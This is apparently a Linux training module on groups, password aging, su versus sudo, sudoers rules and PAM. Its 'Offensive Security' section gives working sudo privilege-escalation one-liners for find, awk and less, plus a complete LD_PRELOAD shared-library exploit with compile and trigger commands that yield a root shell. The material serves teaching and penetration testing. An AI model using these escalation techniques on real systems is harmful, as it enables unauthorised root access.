# Day 06: Advanced User Identity, Sudoers & PAM

---

## 1. Group Management & Access Control

Groups allow system administrators to aggregate users and apply unified file permissions and privileges across collaborative engineering or security teams.

```
                  ┌────────────────────────────────────────┐
                  │          Group Membership Types        │
                  └───────────────────┬────────────────────┘
             ┌────────────────────────┴────────────────────────┐
             ▼                                                 ▼
┌─────────────────────────┐                       ┌─────────────────────────┐
│      Primary Group      │                       │   Supplementary Groups  │
├─────────────────────────┤                       ├─────────────────────────┤
│ • Exactly ONE per user  │                       │ • Zero, one, or many    │
│ • Stored in /etc/passwd │                       │ • Stored in /etc/group  │
│ • Applied to new files  │                       │ • Grants extra ACLs     │
└─────────────────────────┘                       └─────────────────────────┘
```

### 1.1 Group Administration Commands
```bash
# 1. Create a dedicated engineering security group:
sudo groupadd secops

# 2. Assign an explicit GID:
sudo groupadd -g 2500 blue_team

# 3. Add a user to a group (using gpasswd or usermod):
sudo gpasswd -a alice secops
# Alternatively:
sudo usermod -aG secops alice

# 4. Remove a user from a group:
sudo gpasswd -d alice secops

# 5. Delete a group:
sudo groupdel secops

# 6. Audit current user memberships:
id
groups
getent group secops
```

---

## 2. Password Aging Policies & Account Lifecycle (`chage`)

Enforcing password rotation, warning periods, and automatic account expiration prevents stale credentials from serving as dormant attack vectors.

### 2.1 System Defaults: `/etc/login.defs`
System-wide defaults for newly created accounts are defined in `/etc/login.defs`:
```ini
PASS_MAX_DAYS   90      # Maximum password validity duration
PASS_MIN_DAYS   7       # Minimum interval before user can change password again
PASS_WARN_AGE   14      # Days warning issued prior to password expiration
ENCRYPT_METHOD  SHA512  # Hashing algorithm for /etc/shadow
```

### 2.2 Granular User Password Aging: `chage`
The `chage` (change age) command inspects and overrides password expiration attributes for specific accounts:

```bash
# Inspect active aging policy for user 'bob':
sudo chage -l bob

# Enforce enterprise policy:
# -m 7   : Minimum 7 days before changing
# -M 90  : Must change every 90 days
# -W 14  : 14-day warning before expiration
# -I 30  : Inactive for 30 days after expiry locks account
# -E 2026-12-31 : Hard account expiration date
sudo chage -m 7 -M 90 -W 14 -I 30 -E 2026-12-31 bob

# Force user to change their password on very next login:
sudo chage -d 0 bob
```

---

## 3. Privilege Delegation: `su` vs. `su -` vs. `sudo`

Understanding environment sanitization is critical to both systems administration and offensive exploitation:

| Command | Switching Mechanism | Environment Handling | Security & Audit Implication |
| :--- | :--- | :--- | :--- |
| **`su`** | Prompts for target user's password; switches UID | **Preserves caller's `$PATH`, `$HOME`, and variables** | High Risk: vulnerable to `$PATH` poisoning & malicious aliases |
| **`su -`** (or `su -l`) | Full login simulation; prompts for target password | **Completely resets environment to target defaults** | Recommended standard if using `su`; loads clean `/root/.bashrc` |
| **`sudo [cmd]`** | Prompts for **invoking user's** password | Sanitizes environment via `secure_path` in `/etc/sudoers` | Best Practice: Full audit trail in syslog; no shared root password |

---

## 4. Sudoers Architecture & Privilege Delegation

The `sudo` (SuperUser DO) utility is governed by the configuration file `/etc/sudoers` and supplementary snippets in `/etc/sudoers.d/`.

> [!WARNING]
> **NEVER edit `/etc/sudoers` with a standard text editor like nano or vim directly!**
> A single syntax error will lock all administrators out of root access. Always use **`sudo visudo`**, which locks the file and validates syntax before writing changes to disk.

### 4.1 Syntax Anatomy of a Sudoers Rule
```
    alice       ALL = (ALL : ALL)       ALL
      │          │       │     │         │
    User       Hosts   Users Groups   Commands
```
1. **User:** Target user or group (`%admin` or `%sudo` represents a group).
2. **Hosts:** Network hosts where this rule applies (`ALL` = any host).
3. **Users:Groups:** Identities the target user can impersonate (`(ALL : ALL)` or `(root)`).
4. **Commands:** Permitted executable binaries (`ALL`, or specific paths like `/usr/bin/apt-get`).

### 4.2 Sudoers Aliases (Enterprise Scale)
```ini
# User Aliases
User_Alias  DEV_OPS = alice, bob, charlie

# Command Aliases
Cmnd_Alias  WEB_SERVICE = /bin/systemctl restart nginx, /bin/systemctl status nginx
Cmnd_Alias  NET_DEBUG   = /usr/bin/tcpdump, /usr/bin/ss

# Rule Assignment: Allow DEVOPS to restart Nginx without entering a password:
DEV_OPS ALL=(ALL) NOPASSWD: WEB_SERVICE
```

---

## 5. Offensive Security: Privilege Escalation via Sudo Misconfigurations

During penetration testing, one of the first commands executed upon compromising a low-privileged shell is:
```bash
sudo -l
```
This enumerates all commands the current user can execute with elevated privileges.

```
       [ Low-Privileged Shell ]
                  │
                  ▼ (sudo -l)
       [ Sudo Permissions Revealed ]
                  │
       ┌──────────┴──────────┐
       ▼                     ▼
[ NOPASSWD Binary ]     [ LD_PRELOAD Enabled ]
       │                     │
       ▼ (GTFOBins lookup)   ▼ (Custom .so injection)
 [ Instant Root Shell (#) ]
```

### 5.1 Real-World Exploitation Scenarios (GTFOBins)

#### 1. Exploiting `sudo find`
If `sudo -l` shows `(root) NOPASSWD: /usr/bin/find`:
```bash
sudo find . -exec /bin/sh \; -quit
# Drops an instant root shell!
```

#### 2. Exploiting `sudo awk`
If `sudo -l` shows `(root) NOPASSWD: /usr/bin/awk`:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### 3. Exploiting `sudo less` or `sudo man`
If `sudo -l` shows `(root) NOPASSWD: /usr/bin/less`:
```bash
sudo less /etc/hosts
# Once less opens, type:
!/bin/sh
# You now have root!
```

#### 4. The Dangerous `env_keep += "LD_PRELOAD"`
If the sudoers configuration contains:
`Defaults env_keep += "LD_PRELOAD"`
An attacker can compile a malicious shared object library that hijacks execution when any sudo command runs:
```c
// exploit.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```bash
# Compile and trigger:
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/any_allowed_cmd
# Result: Immediate root shell.
```

---

## 6. PAM (Pluggable Authentication Modules)

**PAM** is the dynamic, modular authentication abstraction layer in Linux. Instead of hardcoding authentication routines into every program (`sshd`, `sudo`, `login`, `su`), applications invoke PAM.

```
 [ Application ] (e.g., sshd, sudo, login)
        │
        ▼ (Calls PAM API)
 [ /etc/pam.d/<service> Configuration ]
        │
        ├─► [ pam_unix.so ]      ── Check local /etc/shadow
        ├─► [ pam_faillock.so ]  ── Lock account after 3 failed attempts
        ├─► [ pam_google_authenticator.so ] ── Prompt for MFA OTP token
        └─► [ pam_mkhomedir.so ] ── Auto-create home dir on first login
```

### 6.1 The Four PAM Management Modules
1. **`auth`:** Authenticates the subject (prompts for passwords, biometric keys, tokens).
2. **`account`:** Verifies account validity (has password expired? Is access allowed at this hour?).
3. **`password`:** Manages credential updates (enforces complexity rules via `pam_pwquality.so`).
4. **`session`:** Configures and tears down the user session (mounting directories, setting limits).

### 6.2 PAM Control Flags
* **`required`:** Must succeed. If it fails, PAM continues evaluating other modules, but authentication will ultimately fail.
* **`requisite`:** Must succeed. If it fails, PAM terminates evaluation immediately and rejects authentication.
* **`sufficient`:** If this succeeds and no prior `required` modules failed, authentication succeeds immediately.
* **`optional`:** Used for logging or auxiliary setup; success/failure does not determine access.

---

## Hands-on Lab: Sudoers Audit & PAM Inspection
**Objective:** Sudoers Sandboxing & Privilege Audit.
1. Check what sudo privileges your current user possesses via `sudo -l`.
2. Inspect the PAM configuration for `su` by reading `/etc/pam.d/su`.
3. Locate the `pam_wheel.so` line that restricts `su` execution exclusively to members of the `wheel` or `sudo` group.

